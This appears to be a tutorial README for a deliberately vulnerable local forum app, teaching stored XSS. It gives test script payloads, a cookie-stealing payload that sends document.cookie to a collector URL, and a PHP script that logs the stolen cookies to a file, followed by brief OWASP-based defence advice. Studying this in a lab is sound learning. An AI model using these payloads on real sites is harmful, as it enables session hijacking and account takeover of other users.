>   This was a repo forked from postShuffle, a forum app written with node.js. It's designed to be
>   single-page (meaning that once the forum initially loads, all UI is controlled
>   by client-side code).

### Overview

Clone this [playground repo](https://github.com/hbxz/postShuffle), you can run a local blog server and exploit it's XSS vulnerability, **legally**. 

>   I suggest that you only attack a website in your local machine. 

Use the admin account, (cause the register function is buggy at the moment) you can post a blog, comment on others. Simply put, it is a localhost website that accepts and displays UGC (user generated contents).

If you try to post some plain HTML strings, e.g `<h1>hello world</h1>`  you might find that the post and comment  dose not escape perfectly. There can be some loophole of HTML injection. 

You can try to attack it using some [helpful XSS payload example](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection). I will show you one small example. 

Also check this awesome video: [Cookie Stealing - Computerphile](https://www.youtube.com/watch?v=T1QEs3mdJoc).

### What is XSS

>   Check this [owasp xss artical](https://owasp.org/www-community/attacks/xss/).
>
>   Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. 

Correct me if I'm wrong. My understanding is:

1.  a website has **HTML injection** vulnerability that can lead to **JS injection**

2.  this website presents UGC on other user's browsers

3.  Combining 1 and 2, an attacker can post malicious content that will run on other user's browsers. 
4.  And this malicious content can enjoy the trust and access right as the current website has on target browsers.

This makes cookie stealing possible. E.g: lots of websites use JWT as the passport for authentication. If someone has your JWT, he/she has all your access right. 



### How to attack

-   Identify an XSS endpoint:
    `<script>debugger;</script>`
    
    `<script>console.log('hello JS');</script>`
    
-   stealing cokkie:
    `<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>`

Write the collected data into a file.

```
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
```

Here shows when I inject the js code as a post, this blog web page excute it and request a URL with current cokkie:

![image-20200424113844902](xss_tutorial.assets/image-20200424113844902.png)



### How to defend

It starts from HTML injection. So bisic idea is escaping all the HTML content to it's orignal intended format. Performing the appropriate validation and escaping on the server-side is the core of solution.

Also check this [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).



### Summary

Hey friend. Hope you have fun and get some feeling on "what XSS is". 

>   Please, please, don't get yourself in trouble by having fun illegally. 

Well, it just so happens, my [capstone project](https://github.com/hbxz/capstone-project-sunshine-waiter) also use JWT on access control. I'm the backend guy and responsible for security on all the APIs. You can run it locally and try to crack it. 

If you find any vulnerability, would you mind posting it on the issues so that I can learn from you as well?

Wish have FUN and stay safe!